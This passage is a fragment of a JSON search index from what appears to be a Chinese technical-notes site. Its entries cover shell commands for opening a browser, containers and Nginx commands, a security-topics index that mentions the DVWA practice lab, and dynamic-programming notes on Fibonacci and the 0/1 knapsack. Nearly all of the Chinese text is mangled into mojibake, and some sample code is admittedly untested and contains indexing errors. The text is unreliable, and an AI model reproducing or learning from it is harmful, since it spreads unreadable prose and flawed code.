·ç†è§£COMç»„ä»¶","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-COM-mechanism.html","loc":"/yq-doc-source-docs-Chaotic-COM-mechanism.html"},{"title":"é€šè¿‡å‘½ä»¤æ‰“å¼€ç³»ç»Ÿæµè§ˆå™¨","text":"å‰è¨€ å½“ä½¿ç”¨shell, ä¸”å½“å‰ä¸»æœºæ‹¥æœ‰GUIæµè§ˆå™¨æ—¶, ä¼šæœ‰åœ¨shellä¸­é€šè¿‡æµè§ˆå™¨æ‰“å¼€ç½‘å€çš„éœ€æ±‚ ä½¿ç”¨ Mac open 'https://www.baidu.com' Linux x-www-browser 'https://www.baidu.com' Windows cmd /c start https://www.baidu.com","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Open-the-browser-through-command.html","loc":"/yq-doc-source-docs-Chaotic-Open-the-browser-through-command.html"},{"title":"AI","text":"è¿™ä¸ªå…¶å®æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¹¿çš„ è®¡ç®—æœºè§†è§‰ è‡ªç„¶è¯­è¨€å¤„ç† æ¨èç³»ç»Ÿ æœç´¢å¼•æ“ ç­‰ å› ä¸ºè®¡ç®—æœºæ€§èƒ½å‘å±•è¿…é€Ÿ, æ¯”è¾ƒç«çš„æ˜¯ æ·±åº¦å­¦ä¹ (ç¥ç»ç½‘ç»œ), è¯´ç™½äº†å°±æ˜¯é ç€ç®—åŠ›ä¸€ç›´ç®—, ä»¥å‰çš„æ—¶ä»£é…ç½®ä¸è¡Œ, æ²¡é‚£ä¸ªæ¡ä»¶. æ·±åº¦å­¦ä¹  è®¡ç®—æœºè§†è§‰ æœºå™¨å­¦ä¹  æ•°ç† å¼€æºæ¨¡å‹","tags":"linux","url":"/yq-doc-source-ai.html","loc":"/yq-doc-source-ai.html"},{"title":"æ‚ä¹±æ— ç« ","text":"è®¡ç®—æœºç½‘ç»œ å¤§æ•°æ® ä¸­é—´ä»¶ å¸¸ç”¨å·¥å…·ä½¿ç”¨ å‰ªè¾‘ Base64ç¼–ç  COMæœºåˆ¶ crcæ•°æ®æ ¡éªŒ ffmpeg modä¹‹æ—… è®°å½•vsä¸‹è½½æ…¢çš„é—®é¢˜ ä»£ç å‘½å å…³äºå¹¿å‘Š å…³äºé›ªçƒ å›¾ç‰‡æ ¼å¼ ç‰ˆæœ¬è¯´æ˜ è‡ªå»ºä»£ç† è®¾è®¡æ¨¡å¼ å…³äºä½æ©ç  æ­£åˆ™è¡¨è¾¾å¼ æµè§ˆå™¨è¾“å…¥url ä¸€äº›å¾…çœ‹åšå®¢ æœç´¢å¼•æ“å®ç° ä¸€äº›å¼€æºä¾¿åˆ©çš„Gité¡¹ç›® å‘½ä»¤è¡Œå‚æ•°é€‰é¡¹ç»“æ„ é€šè¿‡å‘½ä»¤æ‰“å¼€æµè§ˆå™¨ å…³äºæœ€åä¸€è¡Œç©ºè¡Œçš„é—®é¢˜","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-index.html","loc":"/yq-doc-source-docs-Chaotic-index.html"},{"title":"å®¹å™¨ã€ä»£ç†ä¸é›†ç¾¤","text":"æš‚æ—¶åªå†™äº†dockerä¸nginx, é›†ç¾¤å¾…è¡¥å…… docker nginx k8s ä»€ä¹ˆæ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Ÿ ç»´åŸºç™¾ç§‘ä¸­çš„è§£é‡Šæ˜¯è¿™æ ·çš„: è™šæ‹ŸåŒ–ï¼ˆæŠ€æœ¯ï¼‰æ˜¯ä¸€ç§èµ„æºç®¡ç†æŠ€æœ¯ï¼Œæ˜¯å°†è®¡ç®—æœºçš„å„ç§å®ä½“èµ„æºï¼ˆCPUã€å†…å­˜ã€ç£ç›˜ç©ºé—´ã€ç½‘ç»œé€‚é…å™¨ç­‰ï¼‰ï¼Œ äºˆä»¥æŠ½ç¼´ã€è½¬æ¢åå‘ˆç°å‡ºæ¥å¹¶å¯ä¾›åˆ†å‰²ã€ç»„åˆä¸ºä¸€ä¸ªæˆ–å¤šä¸ªç”µè„‘é…ç½®ç¯å¢ƒã€‚ å¯¹äºä¸€å°è®¡ç®—æœºï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„åˆ’åˆ†ä¸ºä¸‰å±‚ï¼šä»ä¸‹åˆ°ä¸Šä¾æ¬¡æ˜¯ ç‰©ç†ç¡¬ä»¶å±‚ æ“ä½œç³»ç»Ÿå±‚ åº”ç”¨ç¨‹åºå±‚ å®¹å™¨å’Œè™šæ‹Ÿæœºå·®å¼‚ å®¹å™¨æŠ€æœ¯çš„æ¼”å˜: çº¯ç‰©ç†æœº ----> ç‰©ç†æœºä¸Šå¤šVMWareè™šæ‹Ÿæœº ----> å®¹å™¨ æµªè´¹èµ„æº èŠ‚çœ, ä¹Ÿæœ‰é™åº¦ è½»é‡çº§(æœ‰æ—¶å€™åªæƒ³è¦ä¸€ä¸ªmysqlè¿™ç§, å¯èƒ½è¿˜æƒ³è¦å¤šä¸ªç‰ˆæœ¬å…±å­˜) ä¸æ˜“æ‹“å±•è¿ç§» è¿ç§»æ–¹ä¾¿ æ›´é«˜æ•ˆåˆ©ç”¨ç³»ç»Ÿèµ„æº è¿˜æ˜¯æ¯”è¾ƒé‡é‡çº§ æ³¨è§£ æœ‰ä¸ªè¯¯è§£, Dockerä¸å®Œå…¨ä»£è¡¨å®¹å™¨; Dockeråªæ˜¯å®ç°äº†å®¹å™¨æŠ€æœ¯çš„ä¸€ç§æ–¹å¼ è™šæ‹Ÿæœºå·¥å…·: WMVare WorkStation (ä¸ªäººå­¦ä¹ ä½¿ç”¨), ä»…æ”¯æŒWindows VMVare esxi (ä¼ä¸šç‰ˆè™šæ‹ŸåŒ–); é«˜æ€§èƒ½æœåŠ¡å™¨ç»“åˆï¼Œè¿›è¡ŒæœåŠ¡å™¨èµ„æºè™šæ‹ŸåŒ– KVM, Linuxä¸‹è™šæ‹Ÿå·¥å…· è™šæ‹ŸæœºæŠ€æœ¯ è™šæ‹Ÿæœºæ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶ï¼Œåœ¨å…¶ä¸Šé¢è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œ ä¾‹å¦‚æˆ‘ä»¬ä½¿ç”¨KVMï¼ŒæŒ‡å®šç³»ç»Ÿé•œåƒç„¶åè£…ç³»ç»Ÿï¼Œæœ€ç»ˆå¯ä»¥ä½¿ç”¨ï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€çš„åº”ç”¨ç¨‹åºã€‚ KVMåˆ›å»ºè™šæ‹Ÿæœºæ—¶ï¼Œè‹¥æŒ‡å®šè¾ƒå°‘çš„cpuï¼Œå†…å­˜ï¼Œç¡¬ç›˜ç­‰èµ„æºï¼Œè™šæ‹Ÿæœºæ€§èƒ½è¾ƒä½, ä¸šåŠ¡æ”¯æŒä¸å¥½ã€‚ å®¹å™¨æŠ€æœ¯ å®¹å™¨å†…çš„åº”ç”¨ç¨‹åºç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºçš„å†…æ ¸ä¸Šï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œ ä¹Ÿæ²¡æœ‰å¯¹ç¡¬ä»¶è¿›è¡Œè™šæ‹Ÿï¼Œå› æ­¤å®¹å™¨æ¯”èµ·è™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚ å®¹å™¨å¯¹æ¯”KVMçš„å¥½å¤„ å®¹å™¨èƒ½å¤Ÿæä¾›å®¿ä¸»æœºçš„æ€§èƒ½ï¼Œè€Œkvmè™šæ‹Ÿæœºæ˜¯åˆ†é…å®¿ä¸»æœºç¡¬ä»¶èµ„æºï¼Œ æ€§èƒ½è¾ƒå¼± â€¢åŒæ ·é…ç½®çš„å®¿ä¸»æœºï¼Œæœ€å¤šå¯ä»¥å¯åŠ¨10ä¸ªè™šæ‹Ÿæœºçš„è¯ï¼Œå¯ä»¥å¯åŠ¨100+çš„å®¹å™¨æ•°é‡; å¯åŠ¨ä¸€ä¸ªKVMè™šæ‹Ÿæœºï¼Œå¾—æœ‰ä¸€ä¸ªå®Œæ•´çš„å¼€æœºæµç¨‹ï¼ŒèŠ±è´¹æ—¶é—´è¾ƒé•¿ï¼Œæˆ–è®¸å¾—20Sï¼Œè€Œå¯åŠ¨ä¸€ä¸ªå®¹å™¨åªéœ€è¦ 1S; KVMéœ€è¦ç¡¬ä»¶CPUçš„è™šæ‹ŸåŒ–æ”¯æŒï¼Œè€Œå®¹å™¨ä¸éœ€è¦; dockeræ›´é«˜æ•ˆçš„åˆ©ç”¨ç³»ç»Ÿèµ„æº å®¹å™¨ä¸éœ€è¦è¿›è¡Œç¡¬ä»¶è™šæ‹ŸåŒ–ä»¥åŠè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿçš„é¢å¤–å¼€é”€ï¼Œ dockerå¯¹ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨ç‡æ›´é«˜ï¼Œæ— è®ºæ˜¯åº”ç”¨æ‰§è¡Œï¼Œ æ–‡ä»¶å­˜å‚¨ï¼Œè¿˜æ˜¯åœ¨å†…å­˜æ¶ˆè€—ç­‰æ–¹é¢ï¼Œéƒ½æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´é«˜æ•ˆã€‚ å› æ­¤ä¸€ä¸ªåŒæ ·é…ç½®çš„ä¸»æœºï¼Œå¯ä»¥è¿è¡Œå¤„æ›´å¤šæ•°é‡çš„å®¹å™¨å®ä¾‹ã€‚ é›†ç¾¤ã€åˆ†å¸ƒå¼ã€å¾®æœåŠ¡çš„åŒºåˆ« é›†ç¾¤ å°†åŒä¸€ä»½é¡¹ç›®æˆ–è€…ç³»ç»Ÿ, ç‰©ç†éƒ¨ç½²åˆ°å¤šå°æœºå™¨ä¸Šåˆ†æµ, ç‰©ç†ä¸Šæé«˜å¯ç”¨æ€§ åˆ†å¸ƒå¼ å°†é¡¹ç›®, å‚ç›´/æ°´å¹³ æ‹†åˆ†ä¸ºå¤šä¸ªå­æ¨¡å—, åˆ†å¼€éƒ¨ç½² æ°´å¹³æ‹†åˆ†: æ ¹æ®\"åˆ†å±‚\"çš„æ€æƒ³è¿›è¡Œæ‹†åˆ†ã€‚ æ¯”å¦‚å‰åç«¯åˆ†ç¦»å°±æ˜¯å°† å‰ç«¯è¡¨ç¤ºå±‚ å•ç‹¬æ‹†å‡ºæ¥ å‚ç›´æ‹†åˆ†: æ ¹æ®ä¸šåŠ¡è¿›è¡Œæ‹†åˆ†ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡é€»è¾‘ï¼Œå°†\"ç”µå•†é¡¹ç›®\"æ‹†åˆ†æˆ\"è®¢å•é¡¹ç›®\"ã€\"ç”¨æˆ·é¡¹ç›®\"å’Œ\"ç§’æ€é¡¹ç›®\"ã€‚ æ˜¾ç„¶è¿™ä¸‰ä¸ªæ‹†åˆ†åçš„é¡¹ç›®ï¼Œä»ç„¶å¯ä»¥ä½œä¸ºç‹¬ç«‹çš„é¡¹ç›®ä½¿ç”¨ã€‚åƒè¿™ç§æ‹†åˆ†çš„æ–¹æ³•ï¼Œå°±æˆä¸ºå‚ç›´æ‹†åˆ†ã€‚ å¾®æœåŠ¡ å¯¹äºåˆ†å¸ƒå¼çš„å­æ¨¡å—, è¿›è¡Œæ›´ç»†ç²’åº¦çš„æ‹†åˆ†. ä¸”åœ¨å½“å‰æµç¨‹ä¸‹ä¸å­˜åœ¨æ›´ç»†ç²’åº¦çš„æ‹†åˆ† ä¾‹å¦‚ï¼Œä»¥ä¸Š\"è®¢å•é¡¹ç›®\"æœ¬æ¥å°±æ˜¯å‚ç›´æ‹†åˆ†åçš„å­é¡¹ç›®ï¼Œ ä½†å®é™…ä¸Š\"è®¢å•é¡¹ç›®\"è¿˜èƒ½è¿›ä¸€æ­¥æ‹†åˆ†ä¸º\"è´­ç‰©é¡¹ç›®\"ã€\"ç»“ç®—é¡¹ç›®\"å’Œ\"å”®åé¡¹ç›®\" Nginxå¸¸ç”¨å‘½ä»¤ ä¸€è§ˆ: # å¿«é€Ÿå…³é—­Nginxï¼Œå¯èƒ½ä¸ä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œå¹¶è¿…é€Ÿç»ˆæ­¢webæœåŠ¡ nginx -s stop # å¹³ç¨³å…³é—­Nginxï¼Œä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œæœ‰å®‰æ’çš„ç»“æŸwebæœåŠ¡ nginx -s quit # å› æ”¹å˜äº†Nginxç›¸å…³é…ç½®ï¼Œéœ€è¦é‡æ–°åŠ è½½é…ç½®è€Œé‡è½½ nginx -s reload # é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ nginx -s reopen # ä¸º Nginx æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥ä»£æ›¿ç¼ºçœçš„ nginx -c filename # ä¸è¿è¡Œï¼Œè€Œä»…ä»…æµ‹è¯•é…ç½®æ–‡ä»¶ã€‚nginx å°†æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•çš„æ­£ç¡®æ€§ï¼Œå¹¶å°è¯•æ‰“å¼€é…ç½®æ–‡ä»¶ä¸­æ‰€å¼•ç”¨åˆ°çš„æ–‡ä»¶ nginx -t # æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ nginx -v # æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ç‰ˆæœ¬å’Œé…ç½®å‚æ•° nginx -V # æ ¼å¼æ¢æ˜¾ç¤º nginx é…ç½®å‚æ•° 2>&1 nginx -V | xargs -n1 2>&1 nginx -V | xargs -n1 | grep lua","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-index.html"},{"title":"å®‰å…¨","text":"Pythonç°å¸½å­ kali ç”ŸæˆTLS(SSL)è¯ä¹¦ ä¸€äº›å¤‡å¿˜ å¸¸è§æ¼æ´ ææƒæ€»ç»“ å®‰å…¨é¢†åŸŸçš„AI æ¸—é€æµ‹è¯•æµç¨‹ æ¼æ´ç¼ºé™·åˆ†ç±» ä¸€äº›æœ‰ç”¨çš„ç½‘ç«™ brup å­¦ä¹ è®°å½• é€†å‘å·¥ç¨‹ å¤§è‡´è·¯çº¿ æ¸—é€ å•çº¯çš„æ”»å‡» æ¸—é€æµ‹è¯• æ¨¡æ‹Ÿæ¸—é€(æœ‰æˆæƒä¸é™åˆ¶, ä¿å¯†ç­‰) è¿˜æœ‰ EDU SRC (æ•™è‚²æ¸—é€) ç›¸å…³å·¥å…· DVWA https://github.com/digininja/DVWA é€šè¿‡ç®€å•æ˜äº†çš„ç•Œé¢æ¥ç»ƒä¹ ä¸€äº›æœ€å¸¸è§çš„ Web æ¼æ´ï¼Œæ‰€ç»ƒä¹ çš„æ¼æ´å…·æœ‰ä¸åŒçš„éš¾åº¦çº§åˆ«ã€‚ è¯·æ³¨æ„ï¼Œæ­¤è½¯ä»¶å­˜åœ¨æç¤ºå’Œæ— æç¤ºçš„æ¼æ´ã€‚ è¿™æ˜¯ç‰¹æ„ä¸ºæ­¢ã€‚ æˆ‘ä»¬é¼“åŠ±æ‚¨ä¾é è‡ªå·±çš„èƒ½åŠ›å°è¯•å¹¶å‘ç°å°½å¯èƒ½å¤šçš„å®‰å…¨é—®é¢˜ã€‚ cloneåœ°å€: https://github.com/digininja/DVWA.git é»˜è®¤ç”¨æˆ·å¯†ç : admin password å®‰è£…è§ /docs/å®‰å…¨/å­¦ä¹ è®°å½•/DVWAé¶åœºæ­å»º","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-index.html","loc":"/yq-doc-source-docs-Safety-index.html"},{"title":"æ•°æ®ç»“æ„","text":"æ ‘ Hash å›æº¯ç®—æ³• è´ªå¿ƒç®—æ³• ç®—æ³•-åŠ¨æ€è§„åˆ’ ä¸»è¦æ˜¯è¦æƒ³åˆ°ä¸€ä¸ªçŠ¶æ€è½¬ç§»æ–¹ç¨‹, æ ¹æ®è¿™ä¸ªæ–¹ç¨‹æ¥å†™ä»£ç , ä»¥ ç®—æ³•ç¤ºä¾‹-01èƒŒåŒ…é—®é¢˜ ä¸ºä¾‹ æ³¨è§£ ä¹Ÿå«å¡«è¡¨æ³•, è®°å¿†åŒ–æœç´¢ ç®—æ³•-è´ªå¿ƒ ä»¥ 01 èƒŒåŒ…ä¸ºä¾‹, å…ˆæŒ‰ç…§è´ªå¿ƒçš„æ–¹å‘æ’åº, æ¯”å¦‚è€ƒè™‘ä¸‰ç§æ’åºç­–ç•¥ é‡é‡æœ€è½» ä»·å€¼æœ€é«˜ æ€§ä»·æ¯”æœ€é«˜(ä»·å€¼/é‡é‡æœ€é«˜) ç„¶åæŒ‰ç…§è¿™ä¸ªé¡ºåºä»æœ€å¥½çš„å¼€å§‹, ä½†æ˜¯ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜, ç»“æœä¸ä¸€å®šæ˜¯æœ€ä¼˜è§£. å¯å‚è§: /docs/æ•°æ®ç»“æ„/è´ªå¿ƒç®—æ³•/index æ»šåŠ¨æ•°ç»„ ä¸»è¦å°†ç›®æ ‡é›†ä¸­åœ¨å½“å‰è®¡ç®—éœ€è¦çš„æ•°æ®ä¸Š, ä¸¢å¼ƒä¸å¿…è¦çš„æ•°æ® æ»šåŠ¨æ•°ç»„-æ–æ³¢é‚£å¥‘æ•°åˆ— å…ˆä»¥ æ–æ³¢é‚£å¥‘æ•°åˆ— ä¸ºä¾‹, ç¬¬ä¸€å’Œç¬¬äºŒä¸ªæ•°ä¸º1, åç»­æ¯ä¸€ä¸ªæ•°å‰ä¸¤ä¸ªæ•°ä¹‹å’Œ: 1ã€1ã€2ã€3ã€5ã€8ã€13ã€21ã€34 åŸºç¡€çš„è§£æ³• d = [1, 1] for i in range(2, n): d[i] = d[i-1] + d[i-2] è¿™ä¸ªæ—¶å€™çš„ç©ºé—´å¤æ‚åº¦ä¸ºæ•°ç»„d, O(n) ä¸¤ä¸ªå˜é‡è§£æ³• ä»”ç»†è§‚å¯Ÿ, è®¡ç®—æ¯ä¸€æ­¥å®é™…ä¸Šåªéœ€è¦å‰ä¸¤æ¬¡çš„å€¼å°±è¡Œ, é‚£ä¹ˆå®é™…ä¸Šå¯ä»¥åªéœ€è¦ä¸¤ä¸ªå˜é‡å³å¯: a, b = [1, 1] i = 2 while i < n: a = a+b b = a+b i += 2 # æœ€åéœ€è¦åˆ¤æ–­ä¸€ä¸ªå¥‡å¶å†³å®šè¿”å›aè¿˜æ˜¯b return b if n % 2 == 0 else a è¿™ä¸ªæ—¶å€™ç©ºé—´å¤æ‚åº¦å°±å˜æˆäº†O(2), å°±æ˜¯O(1) å¤§å°ä¸º3æ•°ç»„è§£æ³• æˆ–è€…åˆ©ç”¨ä¸€ä¸ªå¤§å°ä¸º3çš„æ•°ç»„: d = [0, 1, 1] for i in range(2, n): d[0], d[1] = d[1], d[2] d[2] = d[0] + d[1] return d[2] ç®—æ³•ç¤ºä¾‹-01èƒŒåŒ…é—®é¢˜ æœ‰ä¸€ä¸ªç‰©å“é‡é‡æ•°æ® width å’Œ å…¶ä¸­æ¯ä¸€ä¸ªç‰©å“å¯¹åº”çš„ä»·å€¼æ•°ç»„ value, æ¯”å¦‚ width[i] çš„ä»·å€¼æ˜¯ value[i], æ±‚å½“èƒŒåŒ…å®¹é‡ä¸º big-package æ—¶, èƒ½è£…ä¸‹ç‰©å“çš„æœ€å¤§ä»·å€¼ é¦–å…ˆæ‰¾åˆ°çŠ¶æ€è½¬ç§»æ–¹ç¨‹, å®šä¹‰: i, ç‰©å“ä¸‹æ ‡i, è¡¨ç¤ºè¿™ä¸ªç‰©å“ j, å½“å‰èƒŒåŒ…å®¹é‡ d[i][j], è¡¨ç¤ºå½“é€‰æ‹©ç¬¬iä¸ªç‰©å“æ—¶å€™, ä¸”å®¹é‡ä¸ºjæ—¶å€™çš„æœ€å¤§ä»·å€¼ å½“éå†åˆ°ç¬¬iä¸ªç‰©å“æ—¶å€™, æœ‰ä¸¤ç§æƒ…å†µ: é€‰æ‹©ç¬¬iä¸ªç‰©å“, é‚£ä¹ˆ d[i][j] = d[i-1][j-width[i]] + value[i] ä¸é€‰æ‹©ç¬¬iä¸ªç‰©å“, é‚£ä¹ˆ d[i][j] = d[i-1][j] é€‰æ‹©è¿™ä¸¤ä¸ªæƒ…å†µä¸­ä»·å€¼æœ€å¤§çš„é‚£ä¸ª: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) è¦æ³¨æ„è¾¹ç•Œæ¡ä»¶å’Œå®¹é‡å€¼, æ¯”å¦‚å®¹é‡å€¼è¦å¤§äº0æ‰å¯ä»¥é€‰æ‹©å½“å‰ç‰©å“: j-width[i] > 0 è¾¹ç•Œæ¡ä»¶, å½“å®¹é‡jä¸º0çš„æ—¶å€™, å¯¹äºä»»æ„i: d[i][0] = 0 å¦‚æœæ²¡æœ‰ç‰©å“, è™½ç„¶ä¹Ÿå¯ä»¥å®šä¹‰: d[0][j] = 0 ä½†æ˜¯ä»”ç»†è€ƒè™‘æ˜¯æ²¡æœ‰å¿…è¦çš„, ä¸€æ–¹é¢æ˜¯åœ¨içš„ç»´åº¦ä¼šå¤šä¸€å±‚å€¼, å¦ä¸€æ–¹é¢å¯ä»¥ç›´æ¥ä»ç¬¬ä¸€ä¸ªç‰©å“(ä¸‹æ ‡0)æ¥ä½œä¸ºè¾¹ç•Œå€¼, å°±ä¸ç”¨è€ƒè™‘ä¸‹æ ‡å‡1çš„æƒ…å†µ: d[0][j] = value[0] if j >= width[0] else 0 # æˆ–è€…ä¸‰ç›®, ä¼ªä»£ç æ‡‚æ„æ€å°±è¡Œ d[0][j] = j >= width[0] ? value[0] : 0 å½“ç„¶ç”¨æ²¡æœ‰ç‰©å“ä½œä¸ºè¾¹ç•Œå€¼ä¹Ÿå¯ä»¥, ä¸è¿‡è¦æ³¨æ„, è¿™æ ·åé¢ä½¿ç”¨ä¸‹æ ‡æ³¨æ„å‡1, å› ä¸º0è¡¨ç¤ºæ²¡æœ‰ç‰©å“, 1è¡¨ç¤ºç¬¬ä¸€ä¸ªç‰©å“, å¯¹åº”ç´¢å¼•ä¸º0(ä¹Ÿå°±æ˜¯è¦è®°å¾—å‡ä¸€) ä¼ªä»£ç è§£(ä½¿ç”¨ç¬¬ä¸€ä¸ªç‰©å“ä½œä¸ºè¾¹ç•Œ): n = len(width) # n è¡Œ, èƒŒåŒ…æ•° + 1 åˆ—, åˆå§‹å€¼ä¸º 0 d = [[0] * (big_package_size+1) for _ in range(n)] # å½“é€‰æ‹©ç¬¬ä¸€ä¸ªç‰©å“æ—¶, è¾¹ç•Œå€¼ for j in range(big_package_size+1): d[0][j] = value[0] if j >= width[0] else 0 # æ„é€ åŠ¨æ€è½¬ç§»æ–¹ç¨‹ for i in range(n): for j in range(big_package_size+1): if j-width[i] >= 0: d[i][j] = max( d[i-1][j], d[i-1][j-width[i]] + value[i] ) else: d[i][j] = d[i-1][j] # ä¸ºä»€ä¹ˆç›´æ¥æ˜¯æœ€åä¸€ä¸ªå€¼, å› ä¸ºéƒ½æ˜¯ä»ä¸Šä¸€ä¸ªå€¼æ¨å¯¼å‡ºæ¥çš„ max ... return d[n-1][big_package_size] å›¾è§£, ä»¥ç‰©å“é‡é‡ w=[1,3,4], ä»·å€¼ v=[15,20,30], èƒŒåŒ…æœ€å¤§å®¹é‡4ä¸ºä¾‹: åˆ—,å®¹é‡j 0 1 2 3 4 è¡Œ,ç‰©å“i 0 0 15 15 15 15 1 0 15 15 20 35 2 0 15 15 20 35 æ³¨è§£ ä¸éœ€è¦å…ˆæ’åº, å› ä¸ºçœ‹ç‰©å“i, æ˜¯ä¸€ä¸ªä¸ªå­é—®é¢˜, ä¸æ’åºæ˜¯å¦æ— å…³ ä¸¤ä¸ªforå¾ªç¯åµŒå¥—é¡ºåºä¸å½±å“ç»“æœ, å› ä¸º å¦‚æœå¤–å±‚ç”¨ç‰©å“, d[i][j] æ˜¯æ ¹æ® d[i-1][j] ä¸ d[i-1][j-width[i]] ç¡®å®šçš„(éœ€è¦ç”¨çš„ç‰©å“ä¸‹æ ‡iå°äºç­‰äºå½“å‰å±‚é¢, ä¹‹å‰å±‚çš„æ‰€æœ‰jéƒ½æ˜¯æœ‰å€¼çš„), å¦‚æœå¤–å±‚ç”¨å®¹é‡, d[i][j] ä¹Ÿæ˜¯æ ¹æ® d[i-1][j] ä¸ d[i-1][j-width[i]] ç¡®å®šçš„(éœ€è¦ç”¨çš„å®¹é‡jå°äºç­‰äºå½“å‰å±‚, ä¹‹å‰å±‚çš„æ‰€æœ‰iéƒ½æ˜¯æœ‰å€¼çš„), éƒ½åœ¨ä¸Šä¸€å±‚ æç¤º: d[i-1][j - width[i]] æ˜¯ç‰©å“ width[0:i] (ä¸‹æ ‡0åˆ°i-1) çš„æœ€ä¼˜è§£ ç›´æ¥åœ¨ç¼–è¾‘å™¨æ‰‹å†™çš„, æ²¡è¿è¡Œè¿‡, æ‡‚æ„æ€å°±è¡Œ ä¼˜åŒ–ç©ºé—´-æ»šåŠ¨æ•°æ® æ»šåŠ¨æ•°ç»„æ˜¯ä»€ä¹ˆå¯çœ‹ä¸Šé¢ æ»šåŠ¨æ•°ç»„ åˆ†æ, å½“éå†ç‰©å“iæ—¶å€™, éœ€è¦ç”¨çš„æ•°æ®åªæœ‰ç‰©å“i-1çš„, å³åªä¼šä½¿ç”¨ä¸Šä¸€å±‚, åŒºåˆ«å°±æ˜¯æ ¹æ®ä¸åŒçš„æƒ…å†µ, é€‰æ‹©ä¸Šä¸€å±‚çš„ä¸åŒå®¹é‡çš„æ•°æ®, é‚£ä¹ˆæ ¹æ®æ»šåŠ¨æ•°ç»„çš„æ¦‚å¿µ, è¾…åŠ©æ•°ç»„åªè¦ä¸¤å±‚å³å¯(å½“å‰å±‚ä¸ä¸Šä¸€å±‚), è¿™ä¸ªæ—¶å€™å†…å¾ªç¯ä¸ç®¡ä»å¤§åˆ°å° è¿˜æ˜¯ä»å°åˆ°å¤§éå†çš†å¯. å†ä»”ç»†æƒ³æˆ‘ä»¬çš„è§„åˆ’æ–¹ç¨‹: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) å¯ä»¥è½¬æ¢ä¸ºä¸€ç»´: d[j] = max(d[j], d[j-w[i]] + v[i]) ç°åœ¨è®²è®²å†…å¾ªç¯ä¸ºä»€ä¹ˆåº”è¯¥ä»å¤§åˆ°å°. å…ˆçœ‹å¤–å¾ªç¯, æ¯æ¬¡è®¡ç®—ç‰©å“iæ—¶, ç”¨åˆ°çš„ç‰©å“ä¸‹æ ‡åªä¸i-1æœ‰å…³, å†çœ‹å†…å¾ªç¯çš„j, ç”¨åˆ°çš„å€¼æœ‰: j j-width[i] ä¸¤ç§ç­–ç•¥, è¿˜æ˜¯ä»¥ä¸Šé¢çš„ç‰©å“é‡é‡ w=[1,3,4], ä»·å€¼ v=[15,20,30], èƒŒåŒ…æœ€å¤§å®¹é‡4ä¸ºä¾‹: åˆ—,å®¹é‡j 0 1 2 3 4 è¡Œ,ç‰©å“i 0 0 15 15 15 15 1 0 15 15 20 35 2 0 15 15 20 35 æˆ‘ä»¬å°è¯•å°†å…¶è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„, å½“è¡Œç‰©å“i==1æ—¶: d[1][0] = 0 d[1][1] = max(d[0][1], d[0][1-3] + 20) = max(15) = 15 d[1][2] = max(d[0][2], d[0][2-3] + 20) = max(15) = 15 d[1][3] = max(d[0][3], d[0][3-3] + 20) = max(15, 20) = 20 d[1][4] = max(d[0][4], d[0][4-3] + 20) = max(15, 15+20) = 35 å†æ¬¡å¯ä»¥æ€»ç»“å‡º, è®¡ç®—iå±‚æ—¶å€™, åªä¸ä¸Šä¸€å±‚i-1æœ‰å…³(è¿™é‡Œä¾‹å­æ˜¯1-1=0), é‚£åˆ—jä¸ä»€ä¹ˆæœ‰å…³å‘¢, è§‚å¯Ÿç›®å‰çš„i==1å˜åŒ–è¶‹åŠ¿: 1-3 2-3 3-3 4-3 å…¶å®å½’æ ¹ç»“åº•å°±æ˜¯: j - w[i] ä¸”jä¸æ–­å¢å¤§åˆ°æœ€å¤§å®¹é‡, ç„¶åå°±æ›´æ–°å½“å‰å®¹é‡æ—¶å€™çš„å€¼, é‚£ä¹ˆå¯ä»¥è¯´ å½“å‰æ›´æ–°çš„ å®¹é‡åˆ—(j) ä¸ ä¸Šä¸€å±‚çš„: j - w[i] æœ‰å…³, ä¸”: j - w[i] æ€»æ˜¯å°äºç­‰äºjçš„. æ‰€ä»¥å¦‚æœè¦ç”¨ä¸€ç»´æ•°æ®d[j], å½“å†…å¾ªç¯ä»å°åˆ°å¤§éå†çš„æ—¶å€™: d[j] = max(d[j], d[j-w[i]] + v[i]) å…ˆè®°å½•ä¸€ä¸‹å½“å‰çš„dæ•°ç»„d[0]: d = [0, 15, 15, 15, 15] å½’çº³ä¸€ä¸‹å½“i==1çš„æ—¶å€™æ›´æ–°çš„å†…å®¹: d[0] = 0 d[1] = max(d[1], d[1-3] + 20) = max(15) = 15 d[2] = max(d[2], d[2-3] + 20) = max(15) = 15 d[3] = max(d[3], d[3-3] + 20) = max(15, d[0] + 20) = 20 d[4] = max(d[4], d[4-3] + 20) = max(15, 